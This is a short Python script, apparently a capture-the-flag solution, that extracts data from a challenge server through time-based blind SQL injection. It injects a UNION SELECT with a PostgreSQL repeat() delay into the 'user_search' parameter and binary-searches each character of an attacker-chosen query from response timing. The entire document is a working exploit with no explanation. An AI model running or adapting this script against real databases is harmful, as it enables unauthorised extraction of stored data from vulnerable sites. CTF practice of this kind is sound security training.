import requests
import time

x = raw_input(":")

tmp = requests.get("http://challenges.fbctf.com:8081")

ans = ''
for i in range(2000):
    
    l = 20
    r = 128

    while l < r:

        mid = (l + r) // 2

        payload = "http://challenges.fbctf.com:8081/?user_search=kaibro'and 1=2 union select NULL, (select repeat('z',300000000*((ascii(substring(({}),{},1))>{})::integer) )) --".format(x, i+1, mid)

        #print payload
        
        try:
            req = requests.get(payload, cookies=tmp.cookies, timeout=2)
        except:
            bb=1

        a = time.time()
        try:
            req = requests.get(payload, cookies=tmp.cookies, timeout=2)
            res = req.text
        except:
            bb=1
        #print res
        b = time.time()

        if(b - a > 2):
            l = mid + 1
        else:
            r = mid
    ans += chr((l + r) // 2)
    print ans

